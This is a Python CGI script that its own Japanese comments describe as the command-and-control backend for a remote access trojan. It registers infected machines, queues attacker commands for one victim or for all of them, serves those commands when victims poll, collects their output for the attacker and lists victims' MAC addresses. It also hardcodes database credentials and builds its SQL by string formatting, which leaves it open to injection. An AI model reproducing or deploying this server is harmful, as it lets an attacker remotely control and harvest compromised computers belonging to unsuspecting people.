#!/usr/local/bin/python
# -*- coding: utf-8 -*-
import cgi, os, sys, io
import pymysql.cursors

print("Content-Type: text/html; charset=UTF-8\r\n")

conn = pymysql.connect(user='r41n', password='codegeass', host='localhost', db='r41n')
form = cgi.FieldStorage()

response = list()

'''
感染者の登録
'''
if 'reg_user' in form:
	users = list()
	with conn.cursor() as cursor:
		cursor.execute("select * from rat_client")
		for user in cursor.fetchall():
			for _user in user:
				users.append(_user)

	if form['reg_user'].value not in users:
		with conn.cursor() as cursor:
			cursor.execute("insert into rat_client values('{}')".format(form['reg_user'].value))
			conn.commit()

'''
感染者がレスポンスを返すときの処理
'''
if 'user' in form and 'cmd' in form and 'resp' in form:
	try:
		with conn.cursor() as cursor:
			cursor.execute("update rat_data set resp='{}' where user='{}' and cmd='{}' and resp is NULL".format(form['resp'].value, form['user'].value, form['cmd'].value))
			conn.commit()
		print('success')
	except:
		print('error')

elif 'user' in form and 'cmd' in form:
	try:
		if form['user'].value == 'all':
			client = []
			with conn.cursor() as cursor:
				cursor.execute("select * from rat_client")
				for user in cursor.fetchall():
					for _user in user:
						client.append(_user)
			if len(client) == 0:
				raise Exception
			else:
				for c in client:
					with conn.cursor() as cursor:
						cursor.execute("insert into rat_data(user, cmd) values('{}', '{}')".format(c, form['cmd'].value))
						conn.commit()
		else:
			with conn.cursor() as cursor:
				cursor.execute("insert into rat_data(user, cmd) values('{}', '{}')".format(form['user'].value, form['cmd'].value))
				conn.commit()
		print('success')
	except:
		print('error')

'''
感染者がコマンドをとりにきたらコマンドを返す
c_confはreg_user
'''
if 'c_conf' in form:
	with conn.cursor() as cursor:
		cursor.execute("select cmd from rat_data where user='{}' and resp is NULL".format(form['c_conf'].value))
		for cmd in cursor.fetchall():
			for _cmd in cmd:
				response.append(_cmd)
	print(response)

'''
攻撃者がレスポンスをとりにきたらレスポンスを返し、rowを削除
s_confはreg_user
'''
if 's_conf' in form:
	with conn.cursor() as cursor:
		if form['s_conf'].value == 'all':
			cursor.execute("select user, resp from rat_data where resp is not NULL")
			for resp in cursor.fetchall():
				response.append(resp)
	print(response)
	with conn.cursor() as cursor:
		if form['s_conf'].value == 'all':
			cursor.execute("delete from rat_data where resp is not NULL")
			conn.commit()

'''
感染者のMACアドレス一覧を返す
'''
if 'other' in form:
	if form['other'].value == 'mar':
		with conn.cursor() as cursor:
			cursor.execute("select reg_user from rat_client")
			for resp in cursor.fetchall():
				response.append(resp)
		print(response)